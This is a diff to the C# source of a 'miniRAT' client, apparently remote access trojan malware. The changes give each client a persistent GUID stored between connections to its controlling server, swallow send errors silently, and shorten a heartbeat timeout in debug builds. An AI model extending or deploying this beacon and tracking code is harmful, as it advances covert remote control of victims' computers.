@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Configuration;
 using System.IO;
 using System.Net;
 using System.Net.Sockets;
@@ -15,7 +16,8 @@ namespace miniRAT
     {
         //must be same in client and server
         const string separator = "|||";
-        static int clientID = -1;
+
+        static Guid clientID = ClientKeyRegistery.ReadGuid();
         static TcpClient tcpClient;
         private static Mutex sendMutex = new Mutex();
 
@@ -109,7 +111,15 @@ namespace miniRAT
                 if (helloArray.Length < 2)//error in hello response 
                     throw new Exception("Error in hello response");
 
-                clientID = int.Parse(helloArray[0]);
+                clientID = Guid.Parse(helloArray[0].ToString());
+
+                // set client key give from server in first time connected and set to appsetting to use it in next connectin to the server
+                ClientKeyRegistery.UpdateGuid(clientID.ToString());
+                //Configuration configuration = ConfigurationManager.OpenExeConfiguration(ConfigurationUserLevel.None);
+                //configuration.AppSettings.Settings["GUIDKEY"].Value = clientID.ToString();
+                //configuration.Save(ConfigurationSaveMode.Modified);
+                //ConfigurationManager.RefreshSection("appSettings");
+
                 Console.WriteLine("Connected to server id= " + clientID.ToString());
             }
             catch  (Exception ex)
@@ -118,7 +128,6 @@ namespace miniRAT
             }
             return clientSocket;
         }
-        
         /// <summary>
         /// Send data to server
         /// </summary>
@@ -191,6 +200,10 @@ namespace miniRAT
                     clientStream.Write(outStream, 0, outStream.Length);
                     clientStream.Flush();
                     sent = true;
+                }
+                catch
+                {
+
                 }
                 finally { sendMutex.ReleaseMutex(); }
             }
@@ -339,6 +352,12 @@ namespace miniRAT
                 SendData("IsServerAlive");
 
                 int microSecondsTimeOut = 30000000;//30 secound
+#if DEBUG
+
+                    microSecondsTimeOut = 10000000;//60 secound
+                
+#endif
+
                 if (clientSocket.Client.Poll(microSecondsTimeOut, SelectMode.SelectRead) == true)//wait for data
                 {
                     if (clientSocket.Available == 0)
